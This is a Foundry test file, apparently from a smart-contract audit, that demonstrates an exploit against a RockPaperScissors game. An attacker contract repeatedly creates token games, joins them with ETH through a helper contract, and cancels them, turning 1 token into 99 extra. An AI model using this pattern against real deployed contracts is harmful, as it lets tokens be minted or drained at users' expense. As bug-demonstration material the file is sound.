// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../src/WinningToken.sol";
import "../src/RockPaperScissors.sol";
import "forge-std/Test.sol";

contract JoiningWrongGameTypeTest is Test {
    WinningToken token;
    RockPaperScissors game;

    address attacker = makeAddr("attacker");
    address admin = makeAddr("admin");
    uint256 attackerInitialRPSW = 10;
    uint256 times = 99;

    function setUp() public {
        game = new RockPaperScissors();
        token = game.winningToken();

        vm.prank(address(game));
        token.mint(attacker, attackerInitialRPSW);
        require(token.balanceOf(attacker) >= 1, "Setup failed");
    }

    function test_joiningWrongGameType() public {
        vm.startPrank(attacker);

        JoiningWrongGameType exploitContract = new JoiningWrongGameType(
            game,
            token
        );
        token.transfer(address(exploitContract), 1);
        exploitContract.attack(times);
        assertEq(token.balanceOf(attacker), attackerInitialRPSW + times);

        vm.stopPrank();
    }
}

contract Helper {
    RockPaperScissors immutable game;
    WinningToken immutable token;

    constructor(RockPaperScissors _game, WinningToken _token) {
        game = _game;
        token = _token;
    }

    function joinGame(uint256 gameId) external {
        game.joinGameWithEth(gameId);
    }

    function withdraw(uint256 amount, address to) external {
        token.transfer(to, amount);
    }
}

contract JoiningWrongGameType {
    RockPaperScissors immutable game;
    WinningToken immutable token;
    Helper helper;

    constructor(RockPaperScissors _game, WinningToken _token) {
        game = _game;
        token = _token;
        helper = new Helper(_game, _token);
    }

    function attack(uint256 times) external {
        require(token.balanceOf(address(this)) >= 1, "Insufficient tokens");

        for (uint256 i = 0; i < times; i++) {
            token.approve(address(game), 1);
            uint256 gameId = game.createGameWithToken(1, 5 minutes);
            helper.joinGame(gameId);
            game.cancelGame(gameId);
        }
        token.transfer(msg.sender, 1);
        helper.withdraw(times, msg.sender);
    }
}
